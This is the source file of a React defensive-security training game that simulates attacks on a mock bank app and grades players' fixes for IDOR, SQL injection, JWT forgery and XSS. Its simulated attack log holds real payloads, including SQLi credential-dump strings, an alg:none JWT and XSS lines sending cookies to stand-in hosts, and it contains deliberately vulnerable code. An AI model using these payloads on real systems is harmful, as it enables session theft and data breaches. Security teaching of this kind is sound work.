            "❌ Render lastTransfer.note as a JSX text node: {lastTransfer.note}",
        };
      if (!hasUsernameRendered)
        return {
          pass: false,
          feedback: "❌ Render u.username as a JSX text node: {u.username}",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! JSX auto-escapes text nodes, preventing script injection.",
      };
    },
    hints: [
      "Remove dangerouslySetInnerHTML entirely — it is almost never the right tool.",
      "React automatically escapes text when you write it as a JSX expression: {value}",
      `Replace the dangerous divs with:\n<div>\n  Transfer to <b>{lastTransfer.toAccount}</b> completed.\n  Note: {lastTransfer.note}\n</div>\n<div>{u.username}</div>`,
    ],
  },

  idor: {
    kind: "single",
    title: "Fix: IDOR in User Data Endpoint",
    description:
      "The /api/user route returns any user whose ID appears in the JWT without ownership verification. Add server-side checks and parameterize the query.",
    points: 110,
    vulnerableCode: `// ❌ VULNERABLE
export async function GET(req: NextRequest) {
  const token = req.headers.get('Authorization')?.replace('Bearer ', '');
  const decoded: any = getUserFromToken(token!);
  const [rows]: any = await db.query(
    \`SELECT * FROM users WHERE id=\${decoded.id}\`
  );
  return NextResponse.json({ success: true, user: rows[0] });
}`,
    starterCode: `// ✅ YOUR FIX — parameterize and verify ownership
export async function GET(req: NextRequest) {
  const token = req.headers.get('Authorization')?.replace('Bearer ', '');
  const decoded: any = getUserFromToken(token!);
  const [rows]: any = await db.query(
    'SELECT * FROM users WHERE id = ?', [decoded.id]
  );
  const user = rows[0];
  if (/* condition to detect id mismatch */) {
    return NextResponse.json(
      { success: false, message: 'Forbidden' },
      { status: /* correct HTTP status */ }
    );
  }
  return NextResponse.json({ success: true, user });
}`,
    validate: (code) => {
      const hasParamQuery =
        /query\s*\(\s*['"`]SELECT.*WHERE id\s*=\s*\?['"`]/.test(
          code.replace(/\s+/g, " "),
        );
      const has403 = /403/.test(code);
      const hasForbidden = /[Ff]orbidden/.test(code);
      const stillInterpolated =
        /WHERE id=\$\{/.test(code) || /WHERE id='\$/.test(code);
      if (stillInterpolated)
        return {
          pass: false,
          feedback: "❌ Still using string interpolation in the SQL query.",
        };
      if (!hasParamQuery)
        return {
          pass: false,
          feedback:
            "❌ Use: db.query('SELECT * FROM users WHERE id = ?', [decoded.id])",
        };
      if (!has403 || !hasForbidden)
        return {
          pass: false,
          feedback:
            "❌ Return a 403 Forbidden response when user.id !== decoded.id.",
        };
      return {
        pass: true,
        feedback:
          "✅ Correct! Server-side ownership checks prevent IDOR even with forged JWTs.",
      };
    },
    hints: [
      "Use a parameterized query: db.query('SELECT * FROM users WHERE id = ?', [decoded.id])",
      "After fetching the user, compare user.id to decoded.id — they must match.",
      `Add an ownership check:\nif (!user || user.id !== decoded.id) {\n  return NextResponse.json(\n    { success: false, message: 'Forbidden' },\n    { status: 403 }\n  );\n}`,
    ],
  },
};

// ─── Helpers ──────────────────────────────────────────────────────────────────
function uid() {
  return Math.random().toString(36).slice(2, 10).toUpperCase();
}
function r(a: number, b: number) {
  return Math.floor(Math.random() * (b - a) + a);
}
function fakeIp() {
  return `${r(10, 210)}.${r(1, 254)}.${r(1, 254)}.${r(1, 254)}`;
}
function fakePort() {
  return [443, 8080, 3000, 8443, 80][r(0, 5)];
}

const COUNTRIES = ["CN", "RU", "KP", "IR", "US", "BR", "DE", "UA", "RO", "NG"];
const USER_AGENTS = [
  "sqlmap/1.7.8#stable",
  "python-requests/2.31.0",
  "curl/7.88.1",
  "Nikto/2.1.6",
  "Burp Suite Professional/2024",
  "Go-http-client/1.1",
];

const ATTACK_TEMPLATES: Omit<
  LogEntry,
  "id" | "ts" | "ip" | "port" | "patched" | "detected" | "userAgent" | "country"
>[] = [
  {
    type: "jwt_forge",
    severity: "critical",
    user: "0xDarkRoot",
    detail:
      'JWT payload forged: role escalated to "admin" via weak HS256 key bruteforce',
    endpoint: "/api/user",
    method: "GET",
    statusCode: 200,
    payload: '{"alg":"HS256"}.{"id":1,"role":"admin","username":"0xDarkRoot"}',
  },
  {
    type: "jwt_forge",
    severity: "critical",
    user: "GhostProtocol_7",
    detail:
      'Algorithm confusion: JWT header modified to alg:"none", signature stripped',
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload: '{"alg":"none","typ":"JWT"}.{"id":7,"role":"admin"}. [empty sig]',
  },
  {
    type: "sqli_login",
    severity: "critical",
    user: "SQLSlayer99",
    detail:
      "Auth bypass — login succeeded with boolean tautology: ' OR '1'='1'-- ",
    endpoint: "/api/login",
    method: "POST",
    statusCode: 200,
    payload: "username=' OR '1'='1'-- &password=doesntmatter",
  },
  {
    type: "sqli_login",
    severity: "critical",
    user: "ad_min_pwn",
    detail:
      "Auth bypass — admin account accessed via MySQL comment injection: admin'-- ",
    endpoint: "/api/login",
    method: "POST",
    statusCode: 200,
    payload: "username=admin'-- &password=anything",
  },
  {
    type: "sqli_search",
    severity: "critical",
    user: "bl1nd_injector",
    detail:
      "Blind boolean-based SQLi — extracting password hash character by character via /api/search",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'-- ",
  },
  {
    type: "sqli_search",
    severity: "high",
    user: "UnionJack_h4x",
    detail:
      "UNION-based SQLi on /api/search — dumping all user credentials from DB",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=' UNION SELECT id,username,password,email,balance,account_number FROM users-- ",
  },
  {
    type: "idor",
    severity: "high",
    user: "AccessAll_Area",
    detail:
      "IDOR: Sequential account_number enumeration exposing foreign account balances",
    endpoint: "/api/user",
    method: "GET",
    statusCode: 200,
    payload: 'Authorization: Bearer <JWT with forged id=2 targeting "alice">',
  },
  {
    type: "idor",
    severity: "high",
    user: "ParamTamper_X",
    detail:
      "IDOR: Transfer routed to account not owned by the authenticated session",
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload: '{"toAccount":"8829410","amount":"9999","note":"test"}',
  },
  {
    type: "xss",
    severity: "high",
    user: "XSSterminatorV2",
    detail:
      "Stored XSS in transfer note — exfiltrates session cookies via fetch() on victim load",
    endpoint: "/api/transfer",
    method: "POST",
    statusCode: 200,
    payload:
      'note=<img src=x onerror=fetch("https://evil.io/?c="+document.cookie)>',
  },
  {
    type: "xss",
    severity: "medium",
    user: "ReflectedEvil",
    detail:
      "Reflected XSS in search — <script> rendered into DOM via dangerouslySetInnerHTML",
    endpoint: "/api/search",
    method: "GET",
    statusCode: 200,
    payload:
      "query=<script>document.location='https://steal.io/?x='+document.cookie</script>",
  },
];

const SEV_CONFIG: Record<
  Severity,
  { color: string; bg: string; border: string; dot: string; label: string }
> = {
  critical: {
    color: "#b91c1c",
    bg: "#fff1f1",
    border: "#fca5a5",
    dot: "#ef4444",
    label: "CRITICAL",
  },
  high: {
    color: "#c2410c",
    bg: "#fff7ed",
    border: "#fdba74",
    dot: "#f97316",
    label: "HIGH",
  },
  medium: {
    color: "#a16207",
    bg: "#fefce8",
    border: "#fde047",
    dot: "#eab308",
    label: "MEDIUM",
  },
  low: {
    color: "#0d9488",
    bg: "#f0fdfa",
    border: "#5eead4",
    dot: "#14b8a6",
    label: "LOW",
  },
};

const TYPE_LABELS: Record<AttackType, string> = {
  jwt_forge: "JWT FORGERY",
  sqli_login: "SQLI — LOGIN",
  sqli_search: "SQLI — SEARCH",
  idor: "IDOR ATTACK",
  xss: "XSS INJECTION",
};

const TYPE_COLORS: Record<
  AttackType,
  { text: string; bg: string; border: string }
> = {
  jwt_forge: { text: "#7c3aed", bg: "#f5f3ff", border: "#c4b5fd" },
  sqli_login: { text: "#b91c1c", bg: "#fff1f1", border: "#fca5a5" },
  sqli_search: { text: "#be185d", bg: "#fdf2f8", border: "#f9a8d4" },
  idor: { text: "#0369a1", bg: "#eff6ff", border: "#bae6fd" },
  xss: { text: "#c2410c", bg: "#fff7ed", border: "#fed7aa" },
};

const mono = "'JetBrains Mono', 'Fira Code', monospace";
const sans = "'IBM Plex Sans', system-ui, sans-serif";

const C = {
  bg0: "#09090b",
  bg1: "#18181b",
  bg2: "#27272a",
  bg3: "#3f3f46",
  border: "#27272a",
  border2: "#3f3f46",
  green: "#10b981",
  greenDim: "rgba(16, 185, 129, 0.1)",
  greenBorder: "rgba(16, 185, 129, 0.2)",
  red: "#ef4444",
  redDim: "rgba(239, 68, 68, 0.1)",
  amber: "#f59e0b",
  amberDim: "rgba(245, 158, 11, 0.1)",
  purple: "#8b5cf6",
  blue: "#3b82f6",
  text0: "#fafafa",
  text1: "#a1a1aa",
  text2: "#71717a",
  text3: "#52525b",
};

// ─── Main Component ───────────────────────────────────────────────────────────
export default function DefensePage() {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [selected, setSelected] = useState<string | null>(null);
  const [score, setScore] = useState(0);
  const [scoreHistory, setScoreHistory] = useState<ScoreEntry[]>([]);
  const [isRunning, setIsRunning] = useState(true);
  const [elapsed, setElapsed] = useState(0);
  const [alertFlash, setAlertFlash] = useState(false);
  const [toast, setToast] = useState<{ msg: string; ok: boolean } | null>(null);
  const [patchedTypes, setPatchedTypes] = useState<Set<AttackType>>(new Set());
  const [filterTab, setFilterTab] = useState<FilterTab>("all");

  const [challengeOpen, setChallengeOpen] = useState(false);
  const [challengeType, setChallengeType] = useState<AttackType | null>(null);
  const [challengeResult, setChallengeResult] =
    useState<ChallengeResult>("idle");

  // Single-snippet state
  const [challengeCode, setChallengeCode] = useState("");
  const [challengeFeedback, setChallengeFeedback] = useState("");
  const [showHint, setShowHint] = useState(false);

  // Two-file SQLi Login state
  const [sqliLoginActiveTab, setSqliLoginActiveTab] =
    useState<SqliLoginFileTab>("route");
  const [sqliLoginRouteCode, setSqliLoginRouteCode] = useState("");
  const [sqliLoginPageCode, setSqliLoginPageCode] = useState("");
  const [sqliLoginRouteOk, setSqliLoginRouteOk] = useState(false);
  const [sqliLoginPageOk, setSqliLoginPageOk] = useState(false);
  const [sqliLoginRouteFeedback, setSqliLoginRouteFeedback] = useState("");
  const [sqliLoginPageFeedback, setSqliLoginPageFeedback] = useState("");
  const [sqliLoginShowHint, setSqliLoginShowHint] = useState(false);

  // Two-file SQLi Search state
  const [sqliSearchActiveTab, setSqliSearchActiveTab] =
    useState<SqliSearchFileTab>("route");
  const [sqliSearchRouteCode, setSqliSearchRouteCode] = useState("");
  const [sqliSearchPageCode, setSqliSearchPageCode] = useState("");
  const [sqliSearchRouteOk, setSqliSearchRouteOk] = useState(false);
  const [sqliSearchPageOk, setSqliSearchPageOk] = useState(false);
  const [sqliSearchRouteFeedback, setSqliSearchRouteFeedback] = useState("");
  const [sqliSearchPageFeedback, setSqliSearchPageFeedback] = useState("");
  const [sqliSearchShowHint, setSqliSearchShowHint] = useState(false);

  // Two-file JWT state
  const [jwtActiveTab, setJwtActiveTab] = useState<JwtFileTab>("auth");
  const [jwtAuthCode, setJwtAuthCode] = useState("");
  const [jwtRouteCode, setJwtRouteCode] = useState("");
  const [jwtAuthOk, setJwtAuthOk] = useState(false);
  const [jwtRouteOk, setJwtRouteOk] = useState(false);
  const [jwtAuthFeedback, setJwtAuthFeedback] = useState("");
  const [jwtRouteFeedback, setJwtRouteFeedback] = useState("");
  const [jwtShowHint, setJwtShowHint] = useState(false);

  const toastTimer = useRef<NodeJS.Timeout | null>(null);
  const seenRealIds = useRef<Set<string>>(new Set());
  const patchedTypesRef = useRef<Set<AttackType>>(new Set());

  useEffect(() => {
    patchedTypesRef.current = patchedTypes;
  }, [patchedTypes]);

  // Poll for real attacks from localStorage
  useEffect(() => {
    const poll = setInterval(() => {
      try {
        const raw = localStorage.getItem("real_attack_log");
        if (!raw) return;
        const events: any[] = JSON.parse(raw);
        const fresh = events.filter((e) => !seenRealIds.current.has(e.id));
        if (!fresh.length) return;
        fresh.forEach((e) => seenRealIds.current.add(e.id));
        // Normalize legacy "sqli" type from search page to "sqli_search"
        const normalized: LogEntry[] = fresh.map((e) => {
          if (
            e.type === "sqli" &&
            (e.endpoint === "/api/search" ||
              (e.detail && e.detail.includes("/api/search")) ||
              e.detail.includes("search"))
          ) {
            return { ...e, type: "sqli_search" as AttackType };
          }
          if (
            e.type === "sqli" &&
            (e.endpoint === "/api/login" ||
              (e.detail && e.detail.includes("login")) ||
              e.detail.includes("Auth bypass"))
          ) {
            return { ...e, type: "sqli_login" as AttackType };
          }
          if (e.type === "sqli") {
            // fallback: check payload/detail for search indicators
            const isSrc =
              (e.payload && e.payload.includes("query=")) ||
              (e.detail && e.detail.toLowerCase().includes("search"));
            return {
              ...e,
              type: isSrc
                ? ("sqli_search" as AttackType)
                : ("sqli_login" as AttackType),
            };
          }
          return e as LogEntry;
        });
        setLogs((prev) => [...normalized, ...prev].slice(0, 150));
        if (normalized.some((e) => e.severity === "critical")) {
          setAlertFlash(true);
          setTimeout(() => setAlertFlash(false), 600);
        }
      } catch {
        /* ignore */
      }
    }, 600);
    return () => clearInterval(poll);
  }, []);

  const spawnAttack = useCallback(() => {
    const available = ATTACK_TEMPLATES.filter(
      (t) => !patchedTypesRef.current.has(t.type),
    );
    if (!available.length) return;
    const tpl = available[r(0, available.length)];
    const entry: LogEntry = {
      ...tpl,
      id: uid(),
      ts: Date.now(),
      ip: fakeIp(),
      port: fakePort(),
      country: COUNTRIES[r(0, COUNTRIES.length)],
      userAgent: USER_AGENTS[r(0, USER_AGENTS.length)],
      patched: false,
      detected: false,
    };
    setLogs((prev) => [entry, ...prev].slice(0, 150));
    if (entry.severity === "critical") {
      setAlertFlash(true);
      setTimeout(() => setAlertFlash(false), 600);
    }
  }, []);

  useEffect(() => {
    if (isRunning) {
      spawnAttack();
      const t = setInterval(spawnAttack, 6000);
      return () => clearInterval(t);
    }
  }, [isRunning, spawnAttack]);

  useEffect(() => {
    const t = setInterval(() => {
      if (isRunning) setElapsed((e) => e + 1);
    }, 1000);
    return () => clearInterval(t);
  }, [isRunning]);

  const selectedLog = logs.find((l) => l.id === selected);
  const challenge = challengeType ? CHALLENGES[challengeType] : null;

  function showToast(msg: string, ok = true) {
    setToast({ msg, ok });
    if (toastTimer.current) clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(null), 2800);
  }

  function acknowledge(logId: string) {
    const log = logs.find((l) => l.id === logId);
    if (!log) return;
    if (log.detected) {
      showToast("Already acknowledged", false);
      return;
    }
    setLogs((prev) =>
      prev.map((l) => (l.id === logId ? { ...l, detected: true } : l)),
    );
    showToast("Threat acknowledged — now deploy a hotfix to score");
  }

  function openPatch(logId: string) {
    const log = logs.find((l) => l.id === logId);
    if (!log) return;
    if (!log.detected) {
      showToast("Acknowledge the threat first", false);
      return;
    }
    if (patchedTypes.has(log.type)) {
      showToast("This vulnerability is already patched globally", false);
      return;
    }
    const ch = CHALLENGES[log.type];
    if (!ch) return;
    setChallengeType(log.type);
    setChallengeResult("idle");
    setChallengeOpen(true);
    setShowHint(false);
    setChallengeFeedback("");

    if (ch.kind === "two-file-sqli-login") {
      setSqliLoginActiveTab("route");
      setSqliLoginRouteCode(ch.routeStarterCode);
      setSqliLoginPageCode(ch.pageStarterCode);
      setSqliLoginRouteOk(false);
      setSqliLoginPageOk(false);
      setSqliLoginRouteFeedback("");
      setSqliLoginPageFeedback("");
      setSqliLoginShowHint(false);
    } else if (ch.kind === "two-file-sqli-search") {
      setSqliSearchActiveTab("route");
      setSqliSearchRouteCode(ch.routeStarterCode);
      setSqliSearchPageCode(ch.pageStarterCode);
      setSqliSearchRouteOk(false);
      setSqliSearchPageOk(false);
      setSqliSearchRouteFeedback("");
      setSqliSearchPageFeedback("");
      setSqliSearchShowHint(false);
    } else if (ch.kind === "two-file-jwt") {
      setJwtActiveTab("auth");
      setJwtAuthCode(ch.authStarterCode);
      setJwtRouteCode(ch.routeStarterCode);
      setJwtAuthOk(false);
      setJwtRouteOk(false);
      setJwtAuthFeedback("");
      setJwtRouteFeedback("");
      setJwtShowHint(false);
    } else {
      setChallengeCode((ch as SingleSnippetChallenge).starterCode);
    }
  }

  const PATCH_TARGET_MAP: Partial<Record<AttackType, string>> = {
    sqli_login: "sqli",
    sqli_search: "sqli_search",
    jwt_forge: "jwt",
    xss: "xss",
    idor: "idor",
  };

  function applyPatch(type: AttackType, points: number) {
    setLogs((prev) =>
      prev.map((l) => (l.type === type ? { ...l, patched: true } : l)),
    );
    setPatchedTypes((prev) => new Set([...prev, type]));
    const lsKey = PATCH_KEYS[type];
    if (lsKey) localStorage.setItem(lsKey, "1");
    const apiTarget = PATCH_TARGET_MAP[type];
    if (apiTarget) {
      fetch("/api/patch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ target: apiTarget, action: "apply" }),
      }).catch(() => console.warn("[patch] Server-side flag write failed"));
    }
    setScore((s) => s + points);
    setScoreHistory((h) =>
      [
        {
          points,
          ts: Date.now(),
          detail: `${TYPE_LABELS[type]} patched globally`,
          type,
        },
        ...h,
      ].slice(0, 30),
    );
  }

  function submitChallenge() {
    if (!challengeType || !challenge || challenge.kind !== "single") return;
    setChallengeResult("running");
    setTimeout(() => {
      const result = (challenge as SingleSnippetChallenge).validate(
        challengeCode,
      );
      setChallengeResult(result.pass ? "pass" : "fail");
      setChallengeFeedback(result.feedback);
      if (result.pass) applyPatch(challengeType, challenge.points);
    }, 700);
  }

  function submitSqliLoginChallenge() {
    if (
      !challengeType ||
      !challenge ||
      challenge.kind !== "two-file-sqli-login"
    )
      return;
    setChallengeResult("running");
    setTimeout(() => {
      const rv = (challenge as TwoFileSqliLoginChallenge).validateRoute(
        sqliLoginRouteCode,
      );
      const pv = (challenge as TwoFileSqliLoginChallenge).validatePage(
        sqliLoginPageCode,
      );
      setSqliLoginRouteFeedback(rv.feedback);
      setSqliLoginPageFeedback(pv.feedback);
      setSqliLoginRouteOk(rv.pass);
      setSqliLoginPageOk(pv.pass);
      if (rv.pass && pv.pass) {
        setChallengeResult("pass");
        applyPatch(challengeType, challenge.points);
      } else {
        setChallengeResult("fail");
        if (!rv.pass) setSqliLoginActiveTab("route");
        else if (!pv.pass) setSqliLoginActiveTab("page");
      }
    }, 700);
  }

  function submitSqliSearchChallenge() {
    if (
      !challengeType ||
      !challenge ||
      challenge.kind !== "two-file-sqli-search"
    )
      return;
    setChallengeResult("running");
    setTimeout(() => {
      const rv = (challenge as TwoFileSqliSearchChallenge).validateRoute(
        sqliSearchRouteCode,
      );
      const pv = (challenge as TwoFileSqliSearchChallenge).validatePage(
        sqliSearchPageCode,
      );
      setSqliSearchRouteFeedback(rv.feedback);
      setSqliSearchPageFeedback(pv.feedback);
      setSqliSearchRouteOk(rv.pass);
      setSqliSearchPageOk(pv.pass);
      if (rv.pass && pv.pass) {
        setChallengeResult("pass");
        applyPatch(challengeType, challenge.points);
      } else {
        setChallengeResult("fail");
        if (!rv.pass) setSqliSearchActiveTab("route");
        else if (!pv.pass) setSqliSearchActiveTab("page");
      }
    }, 700);
  }

  function submitJwtChallenge() {
    if (!challengeType || !challenge || challenge.kind !== "two-file-jwt")
      return;
    setChallengeResult("running");
    setTimeout(() => {
      const av = (challenge as TwoFileJwtChallenge).validateAuth(jwtAuthCode);
      const rv = (challenge as TwoFileJwtChallenge).validateRoute(jwtRouteCode);
      setJwtAuthFeedback(av.feedback);
      setJwtRouteFeedback(rv.feedback);
      setJwtAuthOk(av.pass);
      setJwtRouteOk(rv.pass);
      if (av.pass && rv.pass) {
        setChallengeResult("pass");
        applyPatch(challengeType, challenge.points);
      } else {
        setChallengeResult("fail");
        if (!av.pass) setJwtActiveTab("auth");
        else if (!rv.pass) setJwtActiveTab("route");
      }
    }, 700);
  }

  function closeChallenge() {
    setChallengeOpen(false);
    setChallengeType(null);
    setChallengeResult("idle");
    setChallengeFeedback("");
    setShowHint(false);
    setSqliLoginRouteFeedback("");
    setSqliLoginPageFeedback("");
    setSqliLoginRouteOk(false);
    setSqliLoginPageOk(false);
    setSqliLoginShowHint(false);
    setSqliSearchRouteFeedback("");
    setSqliSearchPageFeedback("");
    setSqliSearchRouteOk(false);
    setSqliSearchPageOk(false);
    setSqliSearchShowHint(false);
    setJwtAuthFeedback("");
    setJwtRouteFeedback("");
    setJwtAuthOk(false);
    setJwtRouteOk(false);
    setJwtShowHint(false);
  }

  const fmt = (ts: number) =>
    new Date(ts).toLocaleTimeString("en-US", {
      hour12: false,
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
  const fmtEl = (s: number) =>
    `${Math.floor(s / 60)
      .toString()
      .padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;

  const critCount = logs.filter(
    (l) => l.severity === "critical" && !patchedTypes.has(l.type),
  ).length;
  const filteredLogs = logs.filter((l) => {
    const isGP = patchedTypes.has(l.type);
    if (filterTab === "acknowledged") return l.detected && !isGP;
    if (filterTab === "fixed") return isGP;
    return true;
  });
  const tabCounts = {
    all: logs.length,
    acknowledged: logs.filter((l) => l.detected && !patchedTypes.has(l.type))
      .length,
    fixed: logs.filter((l) => patchedTypes.has(l.type)).length,
  };

  // ─── Diff view for SQLi Login ─────────────────────────────────────────────
  function renderSqliLoginDiff(ch: TwoFileSqliLoginChallenge) {
    const lines = ch.routeStarterCode.split("\n");
    const badPattern =
      /`SELECT \* FROM users|WHERE username='\$\{|AND password='\$\{|stack:\s*err\.stack/;
    const fixLines = [
      '    const query = "SELECT * FROM users WHERE username=? AND password=?";',
      "    const [rows]: any = await db.query(query, [username, password]);",
      "",
      "    // Error handler — no stack leak:",
      "    return NextResponse.json(",
      "      { success: false, message: err.message },",
      "      { status: 500 }",
      "    );",
    ];
    return (
      <div style={{ flex: 1, overflowY: "auto", background: C.bg0 }}>
        <DiffHeader
          label="VULNERABLE LINES — api/login/route.ts"
          color={C.red}
        />
        <div style={{ fontFamily: mono, fontSize: 12, lineHeight: 1.8 }}>
          {lines.map((line, i) => (
            <DiffLine
              key={i}
              line={line}
              num={i + 1}
              bad={badPattern.test(line)}
            />
          ))}
        </div>
        <DiffHeader
          label="REQUIRED FIX — replace the red lines with these"
          color={C.green}
          top
        />
        <div
          style={{
            fontFamily: mono,
            fontSize: 12,
            lineHeight: 1.8,
            paddingBottom: 20,
          }}
        >
          {fixLines.map((line, i) => (
            <DiffFixLine key={i} line={line} />
          ))}
        </div>
      </div>
    );
  }

  // ─── Diff view for SQLi Search ────────────────────────────────────────────
  function renderSqliSearchDiff(ch: TwoFileSqliSearchChallenge) {
    const lines = ch.routeStarterCode.split("\n");
    const badPattern =
      /LIKE\s*'%\$\{|`[^`]*\$\{query\}[^`]*`|stack:\s*err\.stack/;
    const fixLines = [
      "    // ✅ FIXED — parameterized LIKE query, no interpolation",
      "    const [result]: any = await db.query(",
      '      "SELECT id, username, email, role, balance, account_number FROM users WHERE username LIKE ?",',
      "      [`%${query}%`]",
      "    );",
      "    rows = result;",
      "",
      "    // Error handler — no stack leak:",
      "    return NextResponse.json(",
      "      { success: false, message: err.message },",
      "      { status: 500 }",
      "    );",
    ];
    return (
      <div style={{ flex: 1, overflowY: "auto", background: C.bg0 }}>
        <DiffHeader
          label="VULNERABLE LINES — api/search/route.ts"
          color={C.red}
        />
        <div style={{ fontFamily: mono, fontSize: 12, lineHeight: 1.8 }}>
          {lines.map((line, i) => (
            <DiffLine
              key={i}
              line={line}
              num={i + 1}
              bad={badPattern.test(line)}
            />
          ))}
        </div>
        <DiffHeader
          label="REQUIRED FIX — replace the red lines with these"
          color={C.green}
          top
        />
        <div
          style={{
            fontFamily: mono,
            fontSize: 12,
            lineHeight: 1.8,
            paddingBottom: 20,
          }}
        >
          {fixLines.map((line, i) => (
            <DiffFixLine key={i} line={line} />
          ))}
        </div>
      </div>
    );
  }

  // ─── Diff view for JWT ────────────────────────────────────────────────────
  function renderJwtDiff(ch: TwoFileJwtChallenge) {
    const authLines = ch.authStarterCode.split("\n");
    const routeLines = ch.routeStarterCode.split("\n");
    const authBadPattern = /jwt\.verify\s*\(|process\.env\.JWT_SECRET\s*\|\|/;
    const routeBadPattern =
      /WHERE id=\$\{|`[^`]*\$\{userId\}|stack:\s*err\.stack/;
    const authFix = [
      "export function getUserFromToken(token: string) {",
      "  return jwt.verify(token, process.env.JWT_SECRET!, {",
      '    algorithms: ["HS256"],',
      "  });",
      "}",
      "",
      "export function signToken(payload: object) {",
      "  return jwt.sign(payload, process.env.JWT_SECRET!, { expiresIn: '7d' });",
      "}",
    ];
    const routeFix = [
      '    const query = "SELECT id, username, email, role, balance, account_number, created_at FROM users WHERE id = ?";',
      "    const [rows]: any = await db.query(query, [userId]);",
      "    // ...",
      "    if (!dbUser || String(dbUser.id) !== String(decoded.id)) {",
      '      return NextResponse.json({ success: false, message: "Forbidden" }, { status: 403 });',
      "    }",
      "    // In catch: remove stack: err.stack",
    ];
    return (
      <div style={{ flex: 1, overflowY: "auto", background: C.bg0 }}>
        <DiffHeader label="VULNERABLE LINES — lib/auth.ts" color={C.red} />
        <div style={{ fontFamily: mono, fontSize: 12, lineHeight: 1.8 }}>
          {authLines.map((line, i) => (
            <DiffLine
              key={i}
              line={line}
              num={i + 1}
              bad={authBadPattern.test(line)}
            />
          ))}
        </div>
        <DiffHeader label="REQUIRED FIX — lib/auth.ts" color={C.green} top />
        <div
          style={{
            fontFamily: mono,
            fontSize: 12,
            lineHeight: 1.8,
            paddingBottom: 12,
          }}
        >
          {authFix.map((line, i) => (
            <DiffFixLine key={i} line={line} />
          ))}
        </div>
        <DiffHeader
          label="VULNERABLE LINES — app/api/user/route.ts"
          color={C.red}
          top
        />
        <div style={{ fontFamily: mono, fontSize: 12, lineHeight: 1.8 }}>
          {routeLines.map((line, i) => (
            <DiffLine
              key={i}
              line={line}
              num={i + 1}
              bad={routeBadPattern.test(line)}
            />
          ))}
        </div>
        <DiffHeader
          label="REQUIRED FIX — app/api/user/route.ts"
          color={C.green}
          top
        />
        <div
          style={{
            fontFamily: mono,
            fontSize: 12,
            lineHeight: 1.8,
            paddingBottom: 20,
          }}
        >
          {routeFix.map((line, i) => (
            <DiffFixLine key={i} line={line} />
          ))}
        </div>
      </div>
    );
  }

  // ─── Hint panel ───────────────────────────────────────────────────────────
  function renderHints(hints: string[]) {
    return (
      <div
        style={{
          padding: "14px 20px",
          background: "rgba(251,191,36,0.06)",
          borderBottom: `1px solid rgba(251,191,36,0.15)`,
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 7,
            marginBottom: 12,
          }}
        >
          <span style={{ fontSize: 13 }}>💡</span>
          <span
            style={{
              fontSize: 10,
              fontWeight: 700,
              letterSpacing: ".12em",
              color: C.amber,
            }}
          >
            HINT
          </span>
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          {hints.map((h, i) => {
            const isCode = h.includes("\n");
            return isCode ? (
              <pre
                key={i}
                style={{
                  margin: 0,
                  padding: "10px 14px",
                  background: "rgba(251,191,36,0.08)",
                  border: "1px solid rgba(251,191,36,0.18)",
                  borderRadius: 6,
                  fontFamily: mono,
                  fontSize: 12,
                  color: "#e8c46a",
                  lineHeight: 1.75,
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                }}
              >
                {h}
              </pre>
            ) : (
              <p
                key={i}
                style={{
                  margin: 0,
                  fontSize: 13,
                  color: "#d4a847",
                  lineHeight: 1.6,
                }}
              >
                {h}
              </p>
            );
          })}
        </div>
      </div>
    );
  }

  // ─── Right sidebar ────────────────────────────────────────────────────────
  function renderRightPane(
    ch: Challenge,
    submitFn: () => void,
    isPassed: boolean,
  ) {
    const getFileStatuses = () => {
      if (ch.kind === "two-file-sqli-login")
        return [
          {
            key: "route",
            label: "route.ts",
            ok: sqliLoginRouteOk,
            fb: sqliLoginRouteFeedback,
            dot: C.purple,
          },
          {
            key: "page",
            label: "page.tsx",
            ok: sqliLoginPageOk,
            fb: sqliLoginPageFeedback,
            dot: C.blue,
          },
        ];
      if (ch.kind === "two-file-sqli-search")
        return [
          {
            key: "route",
            label: "api/search/route.ts",
            ok: sqliSearchRouteOk,
            fb: sqliSearchRouteFeedback,
            dot: C.purple,
          },
          {
            key: "page",
            label: "search/page.tsx",
            ok: sqliSearchPageOk,
            fb: sqliSearchPageFeedback,
            dot: C.blue,
          },
        ];
      if (ch.kind === "two-file-jwt")
        return [
          {
            key: "auth",
            label: "lib/auth.ts",
            ok: jwtAuthOk,
            fb: jwtAuthFeedback,
            dot: C.purple,
          },
          {
            key: "route",
            label: "api/user/route.ts",
            ok: jwtRouteOk,
            fb: jwtRouteFeedback,
            dot: C.blue,
          },
        ];
      return [];
    };

    return (
      <div
        style={{
          width: 300,
          flexShrink: 0,
          display: "flex",
          flexDirection: "column",
          borderLeft: `1px solid ${C.border}`,
          background: C.bg1,
        }}
      >
        <div style={{ padding: "20px 20px 0", flexShrink: 0 }}>
          <button
            onClick={submitFn}
            disabled={challengeResult === "running" || isPassed}
            style={{
              fontFamily: sans,
              width: "100%",
              padding: "12px 0",
              borderRadius: 6,
              fontSize: 14,
              fontWeight: 600,
              border: "1px solid transparent",
              cursor: isPassed
                ? "default"
                : challengeResult === "running"
                  ? "wait"
                  : "pointer",
              transition: "all .15s ease",
              background: isPassed
                ? C.greenDim
                : challengeResult === "running"
                  ? C.bg3
                  : C.text0,
              color: isPassed
                ? C.green
                : challengeResult === "running"
                  ? C.text2
                  : C.bg0,
              borderColor: isPassed ? C.greenBorder : "transparent",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 8,
            }}
          >
            {challengeResult === "running"
              ? "Validating..."
              : isPassed
                ? "✓ System Secured"
                : "Deploy Hotfix"}
          </button>

          {ch.kind === "single" && challengeFeedback && (
            <div
              style={{
                marginTop: 12,
                padding: "11px 14px",
                borderRadius: 8,
                fontSize: 12,
                lineHeight: 1.65,
                ...(challengeResult === "pass"
                  ? {
